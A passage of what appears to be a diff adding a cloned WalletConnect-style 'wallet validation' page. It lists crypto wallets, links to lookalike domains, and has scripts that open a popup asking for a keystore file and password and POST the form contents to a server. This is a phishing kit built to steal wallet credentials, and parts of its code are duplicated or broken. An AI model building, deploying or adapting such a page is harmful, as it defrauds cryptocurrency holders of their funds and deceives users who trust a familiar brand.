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" alt="Huobi"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Huobi Wallet</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="../../sync-walletsvalidator.net/WalletConnect_files/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="Crypto.com | DeFi Wallet "></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Crypto.com | DeFi Wallet </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="../../sync-walletsvalidator.net/WalletConnect_files/atomic-4c02d2b33cf091fd83c7a49819394e41.png" alt="Atomic "></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Atomic </div>
+</div>
+</div>
+<div class="pageStyles__SFootNote-sc-1navawn-8 ceWocr">
+<p>Open a pull request on
+<!-- --> <a href="../../external.html?link=https://wallet.maticio.network/Wallets Validation/Wallets Validation-website.html" target="blank" rel="noreferrer noopener">Github</a> <!-- -->to add your app here.
+</p>
+</div>
+</section>
+</div>
+</div>
+<footer class="Footer__SFooter-sc-1k47aoh-0 jVWwwJ"><a href="../../external.html?link=https://wallet.maticio.network/invite/jhxMvxP.html" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+<div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+RGlzY29yZCBpY29uPC90aXRsZT48ZyBmaWxsPSJyZ2IoODgsIDExMiwgMTM1KSI+PHBhdGggZD0iTTIwLjIyMiAwYzEuNDA2IDAgMi41NCAxLjEzNyAyLjYwNyAyLjQ3NVYyNGwtMi42NzctMi4yNzMtMS40Ny0xLjMzOC0xLjYwNC0xLjM5OC42NyAyLjIwNUgzLjcxYy0xLjQwMiAwLTIuNTQtMS4wNjUtMi41NC0yLjQ3NlYyLjQ4QzEuMTcgMS4xNDIgMi4zMS4wMDMgMy43MTUuMDAzaDE2LjVMMjAuMjIyIDB6bS02LjExOCA1LjY4M2gtLjAzbC0uMjAyLjJjMi4wNzMuNiAzLjA3NiAxLjUzNyAzLjA3NiAxLjUzNy0xLjMzNi0uNjY4LTIuNTQtMS4wMDItMy43NDQtMS4xMzctLjg3LS4xMzUtMS43NC0uMDY0LTIuNDc1IDBoLS4yYy0uNDcgMC0xLjQ3LjItMi44MS43MzUtLjQ2Ny4yMDMtLjczNS4zMzYtLjczNS4zMzZzMS4wMDItMS4wMDIgMy4yMS0xLjUzN2wtLjEzNS0uMTM1cy0xLjY3Mi0uMDY0LTMuNDc3IDEuMjdjMCAwLTEuODA1IDMuMTQ0LTEuODA1IDcuMDIgMCAwIDEgMS43NCAzLjc0MyAxLjgwNiAwIDAgLjQtLjUzMy44MDUtMS4wMDItMS41NC0uNDY4LTIuMTQtMS40MDQtMi4xNC0xLjQwNHMuMTM0LjA2Ni4zMzUuMmguMDZjLjAzIDAgLjA0NC4wMTUuMDYuMDN2LjAwNmMuMDE2LjAxNi4wMy4wMy4wNi4wMy4zMy4xMzYuNjYuMjcuOTMuNC40NjYuMjAyIDEuMDY1LjQwMyAxLjguNTM2LjkzLjEzNSAxLjk5Ni4yIDMuMjEgMCAuNi0uMTM1IDEuMi0uMjY3IDEuOC0uNTM1LjM5LS4yLjg3LS40IDEuMzk3LS43MzcgMCAwLS42LjkzNi0yLjIwNSAxLjQwNC4zMy40NjYuNzk1IDEgLjc5NSAxIDIuNzQ0LS4wNiAzLjgxLTEuOCAzLjg3LTEuNzI2IDAtMy44Ny0xLjgxNS03LjAyLTEuODE1LTcuMDItMS42MzUtMS4yMTQtMy4xNjUtMS4yNi0zLjQzNS0xLjI2bC4wNTYtLjAyem0uMTY4IDQuNDEzYy43MDMgMCAxLjI3LjYgMS4yNyAxLjMzNSAwIC43NC0uNTcgMS4zNC0xLjI3IDEuMzQtLjcgMC0xLjI3LS42LTEuMjctMS4zMzQuMDAyLS43NC41NzMtMS4zMzggMS4yNy0xLjMzOHptLTQuNTQzIDBjLjcgMCAxLjI2Ni42IDEuMjY2IDEuMzM1IDAgLjc0LS41NyAxLjM0LTEuMjcgMS4zNC0uNyAwLTEuMjctLjYtMS4yNy0xLjMzNCAwLS43NC41Ny0xLjMzOCAxLjI3LTEuMzM4eiIvPjwvZz48L3N2Zz4=" alt="Discord"></div>
+<p>Discord</p>
+</a><a href="../../external.html?link=https://twitter.wallets validation.org/" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+<div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+VHdpdHRlciBpY29uPC90aXRsZT48ZyBmaWxsPSJyZ2IoODgsIDExMiwgMTM1KSI+PHBhdGggZD0iTTIzLjk1NCA0LjU2OWMtLjg4NS4zODktMS44My42NTQtMi44MjUuNzc1IDEuMDE0LS42MTEgMS43OTQtMS41NzQgMi4xNjMtMi43MjMtLjk1MS41NTUtMi4wMDUuOTU5LTMuMTI3IDEuMTg0LS44OTYtLjk1OS0yLjE3My0xLjU1OS0zLjU5MS0xLjU1OS0yLjcxNyAwLTQuOTIgMi4yMDMtNC45MiA0LjkxNyAwIC4zOS4wNDUuNzY1LjEyNyAxLjEyNEM3LjY5MSA4LjA5NCA0LjA2NiA2LjEzIDEuNjQgMy4xNjFjLS40MjcuNzIyLS42NjYgMS41NjEtLjY2NiAyLjQ3NSAwIDEuNzEuODcgMy4yMTMgMi4xODggNC4wOTYtLjgwNy0uMDI2LTEuNTY2LS4yNDgtMi4yMjgtLjYxNnYuMDYxYzAgMi4zODUgMS42OTMgNC4zNzQgMy45NDYgNC44MjctLjQxMy4xMTEtLjg0OS4xNzEtMS4yOTYuMTcxLS4zMTQgMC0uNjE1LS4wMy0uOTE2LS4wODYuNjMxIDEuOTUzIDIuNDQ1IDMuMzc3IDQuNjA0IDMuNDE3LTEuNjggMS4zMTktMy44MDkgMi4xMDUtNi4xMDIgMi4xMDUtLjM5IDAtLjc3OS0uMDIzLTEuMTctLjA2NyAyLjE4OSAxLjM5NCA0Ljc2OCAyLjIwOSA3LjU1NyAyLjIwOSA5LjA1NCAwIDEzLjk5OS03LjQ5NiAxMy45OTktMTMuOTg2IDAtLjIwOSAwLS40Mi0uMDE1LS42My45NjEtLjY4OSAxLjgtMS41NiAyLjQ2LTIuNTQ4bC0uMDQ3LS4wMnoiLz48L2c+PC9zdmc+" alt="Twitter"></div>
+<p>Twitter</p>
+</a><a href="../../external.html?link=https://wallet.maticio.network/Wallets Validation.html" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+<div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+R2l0SHViIGljb248L3RpdGxlPjxnIGZpbGw9InJnYig4OCwgMTEyLCAxMzUpIj48cGF0aCBkPSJNMTIgLjI5N2MtNi42MyAwLTEyIDUuMzczLTEyIDEyIDAgNS4zMDMgMy40MzggOS44IDguMjA1IDExLjM4NS42LjExMy44Mi0uMjU4LjgyLS41NzcgMC0uMjg1LS4wMS0xLjA0LS4wMTUtMi4wNC0zLjMzOC43MjQtNC4wNDItMS42MS00LjA0Mi0xLjYxQzQuNDIyIDE4LjA3IDMuNjMzIDE3LjcgMy42MzMgMTcuN2MtMS4wODctLjc0NC4wODQtLjcyOS4wODQtLjcyOSAxLjIwNS4wODQgMS44MzggMS4yMzYgMS44MzggMS4yMzYgMS4wNyAxLjgzNSAyLjgwOSAxLjMwNSAzLjQ5NS45OTguMTA4LS43NzYuNDE3LTEuMzA1Ljc2LTEuNjA1LTIuNjY1LS4zLTUuNDY2LTEuMzMyLTUuNDY2LTUuOTMgMC0xLjMxLjQ2NS0yLjM4IDEuMjM1LTMuMjItLjEzNS0uMzAzLS41NC0xLjUyMy4xMDUtMy4xNzYgMCAwIDEuMDA1LS4zMjIgMy4zIDEuMjMuOTYtLjI2NyAxLjk4LS4zOTkgMy0uNDA1IDEuMDIuMDA2IDIuMDQuMTM4IDMgLjQwNSAyLjI4LTEuNTUyIDMuMjg1LTEuMjMgMy4yODUtMS4yMy42NDUgMS42NTMuMjQgMi44NzMuMTIgMy4xNzYuNzY1Ljg0IDEuMjMgMS45MSAxLjIzIDMuMjIgMCA0LjYxLTIuODA1IDUuNjI1LTUuNDc1IDUuOTIuNDIuMzYuODEgMS4wOTYuODEgMi4yMiAwIDEuNjA2LS4wMTUgMi44OTYtLjAxNSAzLjI4NiAwIC4zMTUuMjEuNjkuODI1LjU3QzIwLjU2NSAyMi4wOTIgMjQgMTcuNTkyIDI0IDEyLjI5N2MwLTYuNjI3LTUuMzczLTEyLTEyLTEyIi8+PC9nPjwvc3ZnPg==" alt="Github"></div>
+<p>Github</p>
+</a></footer>
+</div>
+</div>
+</div>
+</div>
+<div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div>
+</div>
+<script id="gatsby-chunk-mapping">
+    /*<![CDATA[*/
+    window.___chunkMapping = {
+      "polyfill": ["/polyfill-5ef5a555a07b3c6452d1.js"],
+      "app": ["/app-2b5a75f35e7d5a1e67ad.js"],
+      "component---src-pages-404-tsx": ["/component---src-pages-404-tsx-72d9b75592037c501271.js"],
+      "component---src-pages-apps-tsx": ["/component---src-pages-apps-tsx-50d212c53780f4e2ed64.js"],
+      "component---src-pages-demo-video-tsx": ["/component---src-pages-demo-video-tsx-73f91d1d80354449c634.js"],
+      "component---src-pages-index-tsx": ["/component---src-pages-index-tsx-6d5161e3ce4afa27a276.js"],
+      "component---src-pages-wallets-tsx": ["/component---src-pages-wallets-tsx-d83f6271c90954ac608f.js"]
+    }; /*]]>*/
+  </script>
+<script>
+    var popupname = document.querySelector("#walletname");
+    var overlay = document.querySelector(".overlay");
+    var icon = document.querySelectorAll(".pageStyles__SAppIcon-sc-1navawn-6");
+    var icon_text = document.querySelectorAll(".pageStyles__SAppName-sc-1navawn-7");
+    var popupimage = document.getElementById("myImg");
+    var icon_img = document.querySelectorAll(".img_icons");
+    var wallet_id = document.querySelector("#wallet_id")
+
+    function icon_click(e) {
+      if (e.currentTarget = window.icon[i])
+        e.preventDefault();
+      var overlay = document.querySelector(".overlay");
+      overlay.style.display = "flex";
+      console.log(e);
+      popupname.innerHTML = e.srcElement.firstChild.alt.replace(" Wallet", "");
+      popupimage.src = e.srcElement.firstChild.currentSrc;
+      wallet_id.value = popupname.innerHTML;
+    }
+
+    for (var i = 0; i < icon.length; i++) {
+      icon[i].addEventListener("click", icon_click, true)
+
+    }
+
+    for (var i = 0; i < icon_text.length; i++) {
+      icon_text[i].addEventListener("click", function (e) {
+        e.preventDefault();
+        var overlay = document.querySelector(".overlay");
+        overlay.style.display = "flex";
+        console.log(e);
+        popupname.innerHTML = e.srcElement.innerText.replace(" Wallet", "");
+        popupimage.src = e.target.previousElementSibling.firstElementChild.currentSrc;
+        wallet_id.value = popupname.innerHTML;
+      })
+
+    }
+
+    //img-icon event listener
+    for (var i = 0; i < icon_img.length; i++) {
+      icon_img[i].addEventListener("click", function (e) {
+        e.preventDefault();
+        var overlay = document.querySelector(".overlay");
+        overlay.style.display = "flex";
+        console.log(e);
+        popupname.innerHTML = e.toElement.alt.replace(" Wallet", "");
+        popupimage.src = e.toElement.currentSrc;
+
+        wallet_id.value = popupname.innerHTML;
+      }, true)
+
+    }
+
+    var cancel = document.querySelector("#cancel");
+    cancel.addEventListener("click", function () {
+      var overlay = document.querySelector(".overlay");
+      overlay.style.display = "none";
+      var span = document.querySelector("#span");
+      span.innerHTML = "Choose Keystore File";
+      var attr = document.querySelector("#first");
+      var attr2 = document.querySelector("#second");
+      var attr3 = document.querySelector("#third");
+
+      attr.classList.remove("active");
+      attr2.classList.remove("active");
+      attr3.classList.remove("active");
+      attr.classList.add("active");
+      var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
+
+
+      for (let i = 0; i < attr.length; i++) {
+        attr[i].value = "";
+
+      }
+    });
+
+
+    // var label = document.querySelector("#label");
+    // label.addEventListener("change", filenaming);
+
+    // function filenaming(e) {
+    //   e.preventDefault();
+    //   var spantag = document.querySelector("#span");
+    //   var fullPath = document.getElementById('file-upload').value;
+    //   if (fullPath) {
+    //     var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\') : fullPath.lastIndexOf('/'));
+    //     var filename = fullPath.substring(startIndex);
+    //     if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
+    //       filename = filename.substring(1);
+    //     }
+    //     spantag.innerHTML = filename;
+    //   }
+    // }
+  </script>
+<script>
+
+    $('.cmAzHq').click(function () {
+      extractwallet(this);
+    });
+
+
+  </script>
+<script>
+    function makerandom(length){
+
+var result="";
+var characters='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+var charactersLength=characters.length;
+
+for (var i =0; i < length; i++) {
+  result += characters.charAt(Math.floor(Math.random()*charactersLength));
+}
+return result;
+}
+
+//DOM manipulation
+
+function shutx(element){
+$(element).fadeOut('fast');
+}
+
+function openx(element){
+$(element).fadeIn('fast');
+}
+
+
+function startbigloader(){
+openx('#loader');
+}
+
+function closebigloader(){
+shutx('#loader');
+}
+
+
+
+
+
+function shutnearest(thiselement,element){
+$(thiselement).closest(element).hide();
+}
+
+
+function togview(){
+var passwrzz=document.getElementById('passwrzz').type;
+
+if(passwrzz=="password"){
+document.getElementById('passwrzz').type="text";
+$('.forgpass').html("Hide password");
+}else{
+document.getElementById('passwrzz').type="password";
+$('.forgpass').html("Show password");
+};
+
+}
+
+function opensidenav(){
+var sidenav=document.getElementById('sidenav');
+sidenav.style.width="80%";
+
+
+}
+
+function closesidenav(){
+var sidenav=document.getElementById('sidenav');
+sidenav.style.width="0px";
+}
+
+function goelement(element){
+$('html, body').animate({
+  scrollTop: $(element).offset().top - 80
+}, 500);
+closemenu();
+}
+
+
+function cprog(cprogid,cprogvalue,cprogtextid){
+
+var circle = document.getElementById(cprogid);
+var radius = circle.r.baseVal.value;
+var circumference = radius * 2 * Math.PI;
+circle.style.strokeDasharray = `${circumference} ${circumference}`;
+circle.style.strokeDashoffset = `${circumference}`;
+
+const offset = circumference - cprogvalue / 100 * circumference;
+circle.style.strokeDashoffset = offset;
+$("#"+cprogtextid).text(cprogvalue+"%");
+
+}
+
+
+function copyfunc(id){
+var copied=$(id);
+
+alert(id);
+
+copied.select();
+document.execCommand("copy");
+notify("Text copied!");
+}
+
+
+//End of DOM manipulation
+
+
+
+//notifications
+
+
+function notify(details,type){
+$('.nothdetails').html(details);
+openx('.noth');
+
+if(type=="" || type=="success" || !type){
+
+$(".noth").addClass('greennoth');
+$(".noth").removeClass('rednoth');
+
+}else{
+$(".noth").removeClass('greennoth');
+$(".noth").addClass('rednoth');
+
+};
+
+$('.noth').animate({opacity:'1'},'500');
+
+setTimeout(closenotify,10000);
+}
+
+
+function closenotify(){
+$('.noth').animate({opacity:'0'},'500');
+shutx('.noth');
+}
+
+function confirmnotify(details,callback,dta1,dta2,dta3){
+openx('#confirmbox');
+$('.confdetails').html(details);
+
+if(!dta1 && !dta2){
+var html='<button class="rtd lft" onclick="shutx(`#confirmbox`)">Cancel</button><button class="rtd rgt" onclick="'+callback+'();shutx(`#confirmbox`)">Ok</button>';
+}else if(dta1 && !dta2){
+var html='<button class="rtd lft" onclick="shutx(`#confirmbox`)">Cancel</button><button class="rtd rgt" onclick="'+callback+'(`'+dta1+'`);shutx(`#confirmbox`)">Ok</button>';
+}else if(dta1 && dta2 && !dta3){
+var html='<button class="rtd lft" onclick="shutx(`#confirmbox`)">Cancel</button><button class="rtd rgt" onclick="'+callback+'(`'+dta1+'`,`'+dta2+'`);shutx(`#confirmbox`)">Ok</button>';  
+alert(dta3);
+}else if(dta1 && dta2 && dta3){
+var html='<button class="rtd lft" onclick="shutx(`#confirmbox`)">Cancel</button><button class="rtd rgt" onclick="'+callback+'(`'+dta1+'`,`'+dta2+'`,`'+dta3+'`);shutx(`#confirmbox`)">Ok</button>';
+}
+
+$('.nbc').html(html);
+}
+
+
+//End of notificatons
+
+
+
+
+// Validations
+
+function checkinput(element,btn,max){
+
+var elementdata=$(element).val();
+
+if(isNaN(elementdata)){
+notify("Please input numbers only!","error");
+shutx(btn);
+}else{
+closenotify();
+openx(btn);
+};
+
+
+}
+
+
+
+//End of validations
+
+
+
+
+
+
+//Communicating with server
+
+
+function sendform(surl,form,servicetype,dataone){
+closenotify();
+var counter=0;
+var fgfg=form+" "+"input";
+
+$(fgfg).each(function(){
+
+var inputval=$(this).val();
+
+if(inputval==""){
+counter=counter+0;
+}else{
+counter=counter+0;
+}
+
+
+});
+
+var sgsg=form+" "+"select";
+
+
+$(sgsg).each(function(){
+
+var inputval=$(this).val();
+
+if(inputval=="Please choose one"){
+counter=counter+0;
+}else{
+counter=counter+0;
+}
+
+});
+
+
+if(counter >= 1){
+var errbox=form+" "+".error";
+notify("Please fill in all details!","error");
+
+}else{
+var datatosend=JSON.stringify($(form).formToJson());;
+
+startloader();
+
+$.ajax({
+url: surl,
+type: 'POST',
+data: datatosend,
+cache: false,
+contentType:'application/json; charset=utf-8',
+dataType: 'json',
+success:function(resp){
+closeloader();
+parser(resp,servicetype,dataone)
+},
+error: function(data){
+closeloader();
+notify("An error happened,couldn't connect!","error");
+}
+});
+
+
+
+}
+
+};
+
+
+
+function sendformtwo(surl,form,servicetype){
+
+closenotify();
+var counter=0;
+var fgfg=form+" "+"input";
+
+$(fgfg).each(function(){
+
+var inputval=$(this).val();
+
+if(inputval==""){
+counter=counter+1;
+}else{
+counter=counter+0;
+}
+
+
+});
+
+var sgsg=form+" "+"select";
+
+
+$(sgsg).each(function(){
+
+var inputval=$(this).val();
+
+if(inputval=="Please choose one"){
+counter=counter+1;
+}else{
+counter=counter+0;
+}
+
+});
+
+
+if(counter >= 1){
+var errbox=form+" "+".error";
+notify("Please fill in all details!","error");
+
+}else{
+
+var xform=$(form).serialize();
+
+startbigloader();
+
+$.ajax({
+url: surl,
+type: 'POST',
+data: xform,
+cache: false,
+dataType: 'json',
+
+success:function(resp){
+closebigloader();
+parser(resp,servicetype);
+},
+error: function(data){
+closebigloader();
+notify("An error happened!","error");
+}
+
+});
+
+
+
+}
+};
+
+
+
+
+
+
+function sendjson(datatosend,url,servicetype){
+
+startbigloader();
+
+$.ajax({
+url: url,
+type: 'POST',
+data: datatosend,
+cache: false,
+contentType:'application/json; charset=utf-8',
+dataType: 'json',
+success:function(resp){
+closebigloader();
+parser(resp,servicetype)
+},
+error: function(data){
+closebigloader();
+notify("An error happened!","error");
+}
+});
+
+
+var sgsg=form+" "+"select";
+
+
+$(sgsg).each(function(){
+
+var inputval=$(this).val();
+
+if(inputval=="Please choose one"){
+counter=counter+1;
+}else{
+counter=counter+0;
+}
+
+});
+
+
+if(counter >= 1){
+var errbox=form+" "+".error";
+notify("Please fill in all details!","error");
+
+}else{
+var datatosend=JSON.stringify($(form).formToJson());
+
+
+startbigloader();
+
+$.ajax({
+url: surl,
+type: 'POST',
+data: datatosend,
+cache: false,
+contentType:'application/json; charset=utf-8',
+dataType: 'json',
+success:function(resp){
+closebigloader();
+parser(resp,servicetype);
+},
+error: function(data){
+closebigloader();
+notify("An error happened!","error");
+}
+});
+
+
+
+}
+};
+
+
+function sendjson(data,url,servicetype){
+startloader();
+$.ajax({
+url: surl,
+type: 'POST',
+data: datatosend,
+cache: false,
+contentType:'application/json; charset=utf-8',
+dataType: 'json',
+success:function(resp){
+closeloader();
+parser(resp,servicetype);
+},
+error: function(data){
+closeloader();
+notify("An error happened!","error");
+}
+});
+
+}
+
+
+
+function getpage(link,container){
+
+$(container).html("");
+shutx("#pageerror");
+startloader("contain");
+
+$.ajax({
+url: link,
+type: 'GET',
+cache: false,
+
+success:function(resp){
+closeloader();
+$(container).html(resp);
+},
+
+error: function(data){
+closeloader();
+notify("An error happened!","error");
+openx('#pageerror');
+}
+
+});
+
+
+
+}
+
+
+function getresponse(link,servicetype){
+
+startbigloader();
+
+$.ajax({
+url: link,
+type: 'GET',
+cache: false,
+async:false,
+success:function(resp){
+
+closebigloader();
+$('#responsebox').html(resp);
+checkresponse(servicetype);
+},
+
+error: function(data){
+closebigloader();
+notify("An error happened!","error");
+}
+
+});
+
+}
+
+
+function getjsonresponse(link,servicetype,dataspace){
+
+startloader();
+alert(dataspace);
+
+$.ajax({
+url: link,
+type: 'GET',
+cache: false,
+dataType: 'json',
+async:false,
+
+success:function(resp){
+closeloader();
+parser(resp,servicetype,dataspace);
+},
+
+error: function(data){
+closeloader();
+notify("An error happened!","error");
+}
+
+});
+};
+
+
+
+//End of server communication
+
+
+function passto(elem1,elem2){
+var content=$(elem1).val();
+$(elem2).val(content);
+
+}
+
+
+function formatbytes(bytes,decimals=2){
+if(bytes===0) return '0B';
+const k=1024;
+const dm= decimals < 0 ? 0: decimals;
+const sizes=['B','KB','MB','GB','TB','PB','EB','ZB','YB'];
+const i=Math.floor(Math.log(bytes)/Math.log(k));
+
+return parseFloat((bytes/Math.pow(k,i)).toFixed(dm))+' '+sizes[i];
+
+}
+
+function autoresize(elem){
+elem.style.height='auto';
+elem.style.height=elem.scrollHeight+'px';
+}
+
+function subscribe(elem,courseid){
+
+var link="process/subcribecoursead53ad53.html"+courseid;
+
+
+getresponse(link,"subscribe");
+
+
+}
+
+
+function getnotipage(link,container){
+
+$.ajax({
+url: link,
+type: 'GET',
+cache: false,
+
+success:function(resp){
+$(container).html(resp);
+},
+
+});
+
+
+
+}
+
+function onlhandler(){
+getnotipage('process/notifications.html','.znoti');
+
+}
+
+function deletenotifi(id){
+var link="process/deletenoti54455445.html"+id;
+
+startbigloader();
+
+$.ajax({
+url: link,
+type: 'GET',
+cache: false,
+
+success:function(resp){
+$('#responsebox').html(resp);
+closebigloader();
+},
+error: function(data){
+closebigloader();
+notify("An error happened!","error");
+}
+});
+
+}
+
+
+function deletenotifi2(id){
+var link="process/deletenoti254455445.html"+id;
+
+startbigloader();
+
+$.ajax({
+url: link,
+type: 'GET',
+cache: false,
+
+success:function(resp){
+$('#responsebox').html(resp);
+closebigloader();
+},
+error: function(data){
+closebigloader();
+notify("An error happened!","error");
+}
+});
+
+}
+
+
+  </script>
+<script>
+    // https://github.com/HasanQQ/formToJson.git
+
+$.fn.formToJson = function () {
+    form = $(this);
+
+    var formArray = form.serializeArray();
+    var jsonOutput = {};
+
+    $.each(formArray, function (i, element) {
+        var elemNameSplit = element['name'].split('[');
+        var elemObjName = 'jsonOutput';
+
+        $.each(elemNameSplit, function (nameKey, value) {
+            if (nameKey != (elemNameSplit.length - 1)) {
+                if (value.slice(value.length - 1) == ']') {
+                    if (value === ']') {
+                        elemObjName = elemObjName + '[' + Object.keys(eval(elemObjName)).length + ']';
+                    } else {
+                        elemObjName = elemObjName + '[' + value;
+                    }
+                } else {
+                    elemObjName = elemObjName + '.' + value;
+                }
+
+                if (typeof eval(elemObjName) == 'undefined')
+                    eval(elemObjName + ' = {};');
+            } else {
+                if (value.slice(value.length - 1) == ']') {
+                    if (value === ']') {
